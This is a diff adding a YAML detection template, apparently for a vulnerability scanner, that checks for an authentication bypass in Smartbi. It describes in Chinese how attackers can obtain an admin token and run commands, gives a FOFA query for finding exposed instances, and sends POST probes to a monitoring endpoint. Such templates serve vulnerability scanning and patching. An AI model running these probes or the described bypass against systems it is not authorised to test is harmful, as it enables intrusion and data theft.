@@ -1,0 +1,34 @@
+id: smartbi-address-auth-bypass
+
+info:
+  name: Smartbi 权限绕过漏洞
+  author: xpoc,ultimaste
+  severity: high
+  verified: true
+  description: |
+    Smartbi是一款商业智能应用，提供了数据集成、分析、可视化等功能，帮助用户理解和使用他们的数据进行决策。
+    在Smartbi受影响版本中存在权限绕过问题，未授权的攻击者可以通过 RMI 的方式调用 getPassword 接口获取管理员token信息。获取管理员权限后，可进入后台实现任意命令执行，进而对目标系统造成破坏或篡改窃取敏感信息。
+    FOFA: app="SMARTBI"
+  affected: version <= V10
+  solutions: https://www.smartbi.com.cn/patchinfo
+  reference:
+    - https://mp.weixin.qq.com/s/qwTzdnncx1rsswX04uFxCQ
+    - https://mp.weixin.qq.com/s/Bqzk2i-zTABcNLvS7EnW3Q
+    - https://stack.chaitin.com/techblog/detail?id=142
+  tags: smartbi,bypass
+  created: 2023/08/02
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /smartbi/smartbix/api/monitor/setEngineAddress
+      body: className=UserService&methodName=isLogged&params=[]
+    expression: response.body.bcontains(b'smartbix.SmartbiXException')
+  r1:
+    request:
+      method: POST
+      path: /smartbix/api/monitor/setEngineAddress
+      body: className=UserService&methodName=isLogged&params=[]
+    expression: response.body.bcontains(b'smartbix.SmartbiXException')
+expression: r0() || r1() 
